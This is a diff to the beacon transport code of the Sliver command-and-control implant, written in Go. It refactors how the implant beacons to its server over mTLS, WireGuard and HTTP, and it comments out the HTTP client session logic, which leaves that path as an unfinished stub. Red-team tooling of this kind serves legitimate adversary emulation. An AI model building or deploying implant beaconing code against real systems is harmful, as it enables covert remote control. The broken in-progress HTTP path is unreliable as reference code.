@@ -21,8 +21,8 @@ package transports
 import (
 	// {{if .Config.Debug}}
 	"log"
-
 	// {{end}}
+	"sync"
 
 	insecureRand "math/rand"
 	"net/url"
@@ -34,11 +34,10 @@ import (
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
-
 	// {{end}}
 
 	// {{if .Config.HTTPc2Enabled}}
-	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
+
 	// {{end}}
 
 	// {{if .Config.WGc2Enabled}}
@@ -60,10 +59,43 @@ type BeaconClose func() error
 
 // Beacon - Abstract connection to the server
 type Beacon struct {
-	Start BeaconStart
+	start BeaconStart
 	Send  BeaconSend
 	Recv  BeaconRecv
 	Close BeaconClose
+
+	// Target
+	uri *url.URL
+
+	// Transports
+	// httpClient *httpclient.SliverHTTPClient
+
+	// Concurrency & Access
+	mutex *sync.RWMutex
+}
+
+// Alternative ?
+func (b *Beacon) Start() (err error) {
+	// b.mutex.RLock()
+	// defer b.mutex.RUnlock()
+	// proxyConfig := b.uri.Query().Get("proxy")
+	// timeout := GetPollTimeout()
+	// b.httpClient, err = httpclient.HTTPStartSession(b.uri.Host, b.uri.Path, timeout, proxyConfig)
+	// if err != nil {
+	//         // {{if .Config.Debug}}
+	//         log.Printf("http(s) connection error %s", err)
+	//         // {{end}}
+	//         return err
+	// }
+	// if b.httpClient == nil {
+	//         // {{if .Config.Debug}}
+	//         log.Printf("Nil HTTP client after init !!!")
+	//         // {{end}}
+	//         return errors.New("Nil HTTP client after init")
+	// }
+	// proxyURL = b.httpClient.ProxyURL
+	// return b.httpClient.SessionInit()
+	return
 }
 
 func (b *Beacon) Interval() int64 {
@@ -102,7 +134,9 @@ func NextBeacon() *Beacon {
 	log.Printf("Starting beacon loop ...")
 	// {{end}}
 
+	// {{if .Config.IsBeacon}}
 	var beacon *Beacon
+	// {{end}}
 
 	uri := nextCCServer()
 	// {{if .Config.Debug}}
@@ -165,7 +199,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 
 	var conn *tls.Conn
 	beacon := &Beacon{
-		Start: func() error {
+		start: func() error {
 			conn, err = mtls.MtlsConnect(uri.Hostname(), uint16(lport))
 			if err != nil {
 				return err
@@ -206,7 +240,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 	var conn net.Conn
 	var dev *device.Device
 	beacon := &Beacon{
-		Start: func() error {
+		start: func() error {
 			addrs, err := net.LookupHost(uri.Hostname())
 			if err != nil {
 				return err
@@ -253,29 +287,46 @@ func httpBeacon(uri *url.URL) *Beacon {
 	log.Printf("Beaconing -> %s", uri)
 	// {{end}}
 
-	var client *httpclient.SliverHTTPClient
+	// var client *httpclient.SliverHTTPClient
 	beacon := &Beacon{
-		Start: func() error {
-			proxyConfig := uri.Query().Get("proxy")
-			timeout := GetPollTimeout()
-			client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("http(s) connection error %s", err)
-				// {{end}}
-				return err
-			}
-			proxyURL = client.ProxyURL
-			return client.SessionInit()
-		},
-		Recv: func() (*pb.Envelope, error) {
-			return client.ReadEnvelope()
-		},
-		Send: func(envelope *pb.Envelope) error {
-			return client.WriteEnvelope(envelope)
-		},
+		uri:   uri,
+		mutex: &sync.RWMutex{},
 	}
+	// Start: func() error {
+	//         proxyConfig := uri.Query().Get("proxy")
+	//         timeout := GetPollTimeout()
+	//         client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
+	//         if err != nil {
+	//                 // {{if .Config.Debug}}
+	//                 log.Printf("http(s) connection error %s", err)
+	//                 // {{end}}
+	//                 return err
+	//         }
+	//         // {{if .Config.Debug}}
+	//         log.Printf("Nil HTTP client after init !!!")
+	//         // {{end}}
+	//         proxyURL = client.ProxyURL
+	//         return client.SessionInit()
+	// },
+	// Recv: func() (*pb.Envelope, error) {
+	//         return client.ReadEnvelope()
+	// },
+	// Send: func(envelope *pb.Envelope) error {
+	//         if client == nil {
+	//                 // {{if .Config.Debug}}
+	//                 log.Printf("Nil HTTP client !!!")
+	//                 // {{end}}
+	//         }
+	//         if envelope == nil {
+	//                 // {{if .Config.Debug}}
+	//                 log.Printf("Nil envelope!!!")
+	//                 // {{end}}
+	//         }
+	//         return client.WriteEnvelope(envelope)
+	// },
+	// }
 
+	// return beacon
 	return beacon
 }
 
